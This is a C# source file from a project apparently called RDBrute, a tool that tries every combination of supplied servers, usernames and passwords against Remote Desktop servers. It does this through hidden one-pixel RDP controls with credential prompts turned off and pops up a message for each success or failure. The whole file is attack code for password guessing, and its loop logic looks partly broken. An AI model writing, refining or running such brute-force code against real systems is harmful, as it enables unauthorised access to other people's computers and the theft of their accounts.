using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using RDBrute;
using AxMSTSCLib;
using System.Windows.Forms;
using MSTSCLib;

namespace RDBrute {
    class RDPClient {

        public void newclient(Form f, string[] username, string[] password, string[] server, int threads) {

            AxMsRdpClient9NotSafeForScripting[] rdpClient = new AxMsRdpClient9NotSafeForScripting[threads];

            for (int i = 0; i < threads; i++) {
                rdpClient[i] = new AxMsRdpClient9NotSafeForScripting();
            }

            for (int servernumber = 0; servernumber < server.Count(); servernumber++)
            {
                for (int usernamenumber = 0; usernamenumber < username.Count(); usernamenumber++)
                {
                    for (int passwordnumber = 0; passwordnumber < password.Count(); passwordnumber++)
                    {
                        foreach (AxMsRdpClient9NotSafeForScripting client in rdpClient)
                        {
                            f.Controls.Add(client);
                            client.Size = new System.Drawing.Size(1, 1);
                            client.CreateControl();
                            if (client.Connected == 1)
                            {
                                client.Disconnect();
                            }
                            client.OnConnected += Rdp_OnConnected;
                            client.OnLoginComplete += Rdp_OnLoginComplete;
                            client.OnLogonError += new AxMSTSCLib.IMsTscAxEvents_OnLogonErrorEventHandler(Rdp_OnLogonError);
                            client.UserName = username[usernamenumber];
                            client.Server = server[servernumber];
                            
                            ((MSTSCLib.IMsRdpClientAdvancedSettings)client.AdvancedSettings).ClearTextPassword = password[passwordnumber];
                            ((MSTSCLib.IMsRdpClientAdvancedSettings8)client.AdvancedSettings8).EnableCredSspSupport = true;
                            var stuff = client.GetOcx() as IMsRdpClientNonScriptable7;
                            stuff.PromptForCredentials = false;

                            client.Connect();

                            //Console.WriteLine(username[usernamenumber]);
                            //Console.WriteLine(password[passwordnumber]);
                            //Console.WriteLine(server[servernumber]);
                        }
                    }
                }
            }

            //AxMsRdpClient9NotSafeForScripting rdpClient = new AxMsRdpClient9NotSafeForScripting();
            //f.Controls.Add(rdpClient);
            //rdpClient.CreateControl();
            //rdpClient.OnConnected += Rdp_OnConnected;
            //rdpClient.OnLoginComplete += Rdp_OnLoginComplete;
            //rdpClient.OnLogonError += new AxMSTSCLib.IMsTscAxEvents_OnLogonErrorEventHandler(Rdp_OnLogonError);
            //rdpClient.UserName = username;
            //rdpClient.Server = server;
            //((MSTSCLib.IMsRdpClientAdvancedSettings)rdpClient.AdvancedSettings).ClearTextPassword = password;
            //((MSTSCLib.IMsRdpClientAdvancedSettings8)rdpClient.AdvancedSettings8).EnableCredSspSupport = true;
            //var stuff = rdpClient.GetOcx() as IMsRdpClientNonScriptable7;
            //stuff.PromptForCredentials = false;

            //rdpClient.Connect();
            //Console.Write(rdpClient);
        }

        public void Rdp_OnConnected(object sender, EventArgs e) {
            MessageBox.Show("Connected");
        }

        public void Rdp_OnLoginComplete(object sender, EventArgs e) {
            MessageBox.Show("LoggedIn");
        }

        public void Rdp_OnLogonError(object sender, IMsTscAxEvents_OnLogonErrorEvent e) {
            MessageBox.Show("Failed");
            Console.WriteLine("failed");
        }

    }
}
